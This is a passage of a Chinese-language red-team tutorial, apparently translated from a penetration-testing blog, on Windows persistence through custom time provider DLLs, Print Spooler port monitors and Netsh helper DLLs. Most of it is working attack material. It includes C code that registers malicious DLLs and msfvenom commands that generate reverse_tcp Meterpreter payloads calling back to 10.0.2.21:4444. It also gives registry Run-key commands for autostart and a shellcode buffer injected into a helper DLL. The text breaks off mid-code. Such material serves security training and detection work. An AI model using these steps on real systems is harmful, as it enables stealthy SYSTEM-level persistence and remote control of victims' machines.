<p>根据Microsoft <a href="https://docs.microsoft.com/en-gb/windows/win32/sysinfo/creating-a-time-provider" target="_blank" rel="noopener noreferrer">文档，</a>时间提供者必须实现以下回调函数。</p>
<ul>
<li>TimeProvOpen</li>
<li>TimeProvCommand</li>
<li>TimeProvClose</li>
</ul>
<p><strong>TimeProvOpen</strong>用于返回提供者句柄，<strong>TimeProvCommand</strong>用于将命令发送到时间提供者，而<strong>TimeProvClose</strong>用于关闭时间提供者。</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HRESULT __stdcall TimeProvOpen(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_  WCHAR                *wszName,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_  TimeProvSysCallbacks *pSysCallbacks,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _Out_ TimeProvHandle       *phTimeProv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(pSysCallbacks);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(phTimeProv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OutputDebugStringW(wszName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HRESULT __stdcall TimeProvCommand(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ TimeProvHandle hTimeProv,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ TimeProvCmd    eCmd,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ PVOID          pvArgs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(hTimeProv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(eCmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(pvArgs);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HRESULT __stdcall TimeProvClose(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ TimeProvHandle hTimeProv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(hTimeProv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return (S_OK);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="时间提供者–回调功能" src="/assets/images/894761-20191111134750241-1284837023-d1771d6dceaf107357cfee1fb720960a.png" width="1024" height="753" class="img_ev3q"></p>
<p>GameTime提供程序将在系统上填充以下注册表项，因为它们是Microsoft时间提供程序规范的一部分。</p>
<ul>
<li>DllName,</li>
<li>Enabled</li>
<li>InputProvider</li>
</ul>
<p>该<strong>DLLNAME</strong>指示包含供应商，该DLL的名称<strong>启用</strong>使然是否提供商应在系统启动过程中启动。值“ 1”启动系统的提供者，而<strong>InputProvider</strong>指示提供者是输入还是输出。注册表值“ 1”表示已输入提供者。这些在下面的代码中指定：</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nRet = RegSetValueExW(hkTimeProvider,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      L&quot;DllName&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      0,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      REG_SZ,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      (LPBYTE)g_wzModule,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      (DWORD)wcslen(g_wzModule)*sizeof(WCHAR)+sizeof(WCHAR));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (ERROR_SUCCESS != nRet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OutputError(L&quot;RegCreateKeyExW failed&quot;, nRet);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    goto ErrorExit;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nRet = RegSetValueExW(hkTimeProvider,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      L&quot;Enabled&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      0,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      REG_DWORD,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      (LPBYTE)&amp;dwOne,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      sizeof(dwOne));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (ERROR_SUCCESS != nRet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OutputError(L&quot;RegCreateKeyExW failed&quot;, nRet);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    goto ErrorExit;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nRet = RegSetValueExW(hkTimeProvider,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      L&quot;InputProvider&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      0,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      REG_DWORD,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      (LPBYTE)&amp;dwOne,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      sizeof(dwOne));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (ERROR_SUCCESS != nRet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OutputError(L&quot;RegCreateKeyExW failed&quot;, nRet);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    goto ErrorExit;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="时间提供者–注册表项值" src="/assets/images/894761-20191111134810603-1074824702-1bf8deff9f5ffef9ab7ebb62d5c5e5d1.png" width="1024" height="724" class="img_ev3q"></p>
<p>该代码还使用<strong>Deregister</strong>回调函数从系统中删除创建的注册表项<strong>GameTime</strong>，作为清理过程。</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\GameTime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void CALLBACK Deregister(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ HWND hWnd,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ HINSTANCE hInst,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ LPSTR pwzCmdLine,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    _In_ int nCmdShow)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    long    nRet;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(hWnd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(hInst);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(pwzCmdLine);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    UNREFERENCED_PARAMETER(nCmdShow);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    OutputDebugStringW(L&quot;Unregister\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    nRet = RegDeleteKeyW(HKEY_LOCAL_MACHINE, GAMETIME_SVC_KEY_NAME);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (ERROR_SUCCESS != nRet)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        OutputError(L&quot;RegDeleteKeyW failed!&quot;, nRet);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        goto ErrorExit;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ErrorExit:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="注销回调功能" src="/assets/images/894761-20191111135053322-1257398998-4b5c51d91dc21d12a881701683ff09e8.png" width="1024" height="688" class="img_ev3q"></p>
<p>实际上，可以使用<strong>rundll32</strong>向系统注册DLL，以便创建关联的注册表项，默认情况下，该注册表项将与系统一起启用新的时间提供程序。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rundll32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe gametime</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">Register</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="注册新的时间提供者" src="/assets/images/894761-20191111134844577-2033208265-2d780dd9319e824478a2a157143b955c.png" width="1024" height="278" class="img_ev3q"></p>
<p>将创建注册表项<strong>GameTime</strong>，并且<strong>DllName</strong>将包含DLL的路径。</p>
<p><img decoding="async" loading="lazy" alt="新时间提供商注册表项" src="/assets/images/894761-20191111134901319-906395250-e02fb7f0ed304eaa7b83e64aacc33a1c.png" width="1024" height="486" class="img_ev3q"></p>
<p>再次修改注册表以包含任意DLL，将在服务重新启动期间执行类似于Windows时间提供程序的代码。</p>
<p><img decoding="async" loading="lazy" alt="新时间提供商注册表项修改" src="/assets/images/894761-20191111135132616-1441953181-c40dcfc34d4a51d769e36429c2bdea87.png" width="1024" height="412" class="img_ev3q"></p>
<p>该<strong>注销</strong>功能可用于删除所有相关联的密钥和系统上进行清理。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rundll32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe gametime</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">Deregister</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111135146932-2098684535-182a73c0ea4b2d11fd17b577cd074704.png" width="1024" height="266" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="print-spooler端口监视器">Print Spooler端口监视器<a href="#print-spooler端口监视器" class="hash-link" aria-label="Print Spooler端口监视器的直接链接" title="Print Spooler端口监视器的直接链接">​</a></h3>
<p>后台打印程序服务负责管理Windows操作系统中的打印作业。与服务的交互通过打印后台处理程序API执行，**该API包含一个函数（AddMonitor），可用于安装本地端口监视器并连接配置、数据和监视器文件。**此函数能够将DLL注入spoolsv.exe进程，并且通过创建注册表项，red team operator可以在系统上实现持久性。</p>
<p><a href="https://twitter.com/silentbreaksec" target="_blank" rel="noopener noreferrer">Brady Bloxham</a>在<a href="https://www.youtube.com/watch?v=dq2Hv7J9fvk" target="_blank" rel="noopener noreferrer">Defcon 22上</a>演示了这种持久性技术。应该注意的是，此技术需要管理员级别的特权，并且DLL必须拖放到磁盘上。<a href="https://twitter.com/spotheplanet" target="_blank" rel="noopener noreferrer">Mantvydas Baranauskas</a>在他的<a href="https://ired.team/offensive-security/persistence/t1013-addmonitor" target="_blank" rel="noopener noreferrer">网站上</a>使用了以下代码，作为他的红队笔记的一部分。</p>
<p>该<strong>WINDOWS.H</strong>报头包括<strong>Winspool.h</strong>这是由微软规范所需的头。该<strong>MONITOR_INFO_2</strong>用于指定必要的监控细节是：</p>
<ul>
<li><strong>pName</strong> //监视器名称</li>
<li><strong>pEnvironment</strong> //环境架构</li>
<li><strong>pDLLName</strong> //监视器DLL文件的名称</li>
</ul>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &quot;Windows.h&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int main() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MONITOR_INFO_2 monitorInfo;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    TCHAR env[12] = TEXT(&quot;Windows x64&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    TCHAR name[12] = TEXT(&quot;Monitor&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    TCHAR dll[12] = TEXT(&quot;test.dll&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    monitorInfo.pName = name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    monitorInfo.pEnvironment = env;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    monitorInfo.pDLLName = dll;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    AddMonitor(NULL, 2, (LPBYTE)&amp;monitorInfo);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="AddMonitor功能" src="/assets/images/894761-20191111140023331-952117864-25bbf5e466a8ef3af0be0ea7cee9a0f3.png" width="1024" height="411" class="img_ev3q"></p>
<p>编译代码将生成一个可执行文件（在本例中为Monitors.exe），该可执行文件将在系统上执行恶意DLL（test.dll）的注册。Metasploit框架可用于生成将服务于Meterpreter有效负载的DLL文件。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.2.21 </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4444</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> dll </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> test.dll</span><br></span></code></pre></div></div>
<p>该DLL必须复制到System32文件夹上，因为根据Microsoft <a href="https://docs.microsoft.com/en-us/windows/win32/printdocs/addmonitor" target="_blank" rel="noopener noreferrer">文档，</a>这是<strong>AddMonitor</strong>函数的预期位置，以便加载相关的DLL 。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">copy C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Users</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">pentestlab</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Desktop</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">test.dll C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Monitors.exe</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140042168-154593214-05542759a5c05c505e665f6e4a3ed89e.png" width="1024" height="343" class="img_ev3q"></p>
<p>Monitors.exe必须与恶意DLL位于同一文件夹（System32）中。执行该文件将与Meterpreter建立通信。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140102723-1846881912-5e9bea8d57b5be14cb4d8608fa23e94a.png" width="724" height="174" class="img_ev3q"></p>
<p>但是，为了实现持久性，在“ <strong>Monitors</strong> ”注册表位置下需要一个密钥。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors</span><br></span></code></pre></div></div>
<p>以下命令将创建一个注册表项，该注册表项将包含值<strong>test.dll</strong>。从编辑器中查看注册表将验证密钥是否已创建。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;hklm\system\currentcontrolset\control\print\monitors\Pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Driver&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;test.dll&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="端口监视器–注册表项" src="/assets/images/894761-20191111140129246-835720952-82e92ea45ebeff43f794ab4a2353ce48.png" width="1024" height="499" class="img_ev3q"></p>
<p>下次重新启动时，spoolsv.exe进程将加载Monitors注册表项中存在并存储在Windows文件夹System32中的所有驱动程序DLL文件。</p>
<p>下图演示了Meterpreter会话已建立与Print Spooler服务（SYSTEM）相同级别的特权，并且已从System32文件夹（已删除test.dll的文件夹）执行了执行。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140147135-1226211952-917c42155626e79def2fa7e8689b4597.png" width="723" height="239" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="netsh-helper-dll">Netsh Helper DLL<a href="#netsh-helper-dll" class="hash-link" aria-label="Netsh Helper DLL的直接链接" title="Netsh Helper DLL的直接链接">​</a></h3>
<p>Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。</p>
<p>生成恶意的DLL</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.2.21 </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4444</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> dll </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/pentestlab.dll</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140516717-991869726-72ab9425d2e0e8ec418dae2aa3b17383.png" width="723" height="222" class="img_ev3q"></p>
<p>添加助手dll</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">netsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add helper path-to-malicious-dll</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140547648-995495170-b7d1829a73afd15003fc0b33be33e7fa.png" width="605" height="102" class="img_ev3q"></p>
<p>每次netsh实用程序启动时，都会执行DLL，并且将建立通信。</p>
<p>但是，默认情况下，netsh没有计划自动启动。创建将在Windows启动期间执行实用程序的注册表项将在主机上创建持久性。这可以直接从Meterpreter会话或Windows Shell中完成。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\SysWOW64\netsh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg setval </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v pentestlab </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&#x27;C:\Windows\SysWOW64\netsh&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140618646-1764925445-68b26ab71815bf2532baab4b1bb76e67.png" width="738" height="282" class="img_ev3q"></p>
<p><a href="https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/" target="_blank" rel="noopener noreferrer">注册表运行键的</a>替代方法是，可以使用多种其他方法来启动实用程序，例如创建<a href="https://pentestlab.blog/2019/10/07/persistence-new-service/" target="_blank" rel="noopener noreferrer">服务</a>或计划任务。</p>
<hr>
<p>一家总部位于荷兰的IT安全公司，该公司率先在其<a href="https://github.com/outflanknl/NetshHelperBeacon" target="_blank" rel="noopener noreferrer">Github</a>存储库中发布概念证明DLL 。DLL是由<a href="https://twitter.com/MarcOverIP" target="_blank" rel="noopener noreferrer">Marc Smeets</a>用C编写的，可以对其进行修改以包含自定义的shellcode。Metasploit Framework实用程序“ <strong>msfvenom</strong> ”可用于生成各种语言的shellcode。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a x64 </span><span class="token operator" style="color:#393A34">--</span><span class="token plain">platform Windows </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">p windows/x64/meterpreter/reverse_tcp </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">b </span><span class="token string" style="color:#e3116c">&#x27;\x00&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">f c</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="C Shellcode – Netsh" src="/assets/images/894761-20191111140719211-121162434-71841a35d55665a0338596c67dd38fad.png" width="921" height="421" class="img_ev3q"></p>
<p>可以将生成的shellcode注入到Netsh Helper DLL代码中。</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;stdio.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;windows.h&gt; // only required if you want to pop calc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#ifdef _M_X64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf[] = &quot;\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf[] = &quot;\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb&quot;;</span><br></span><span 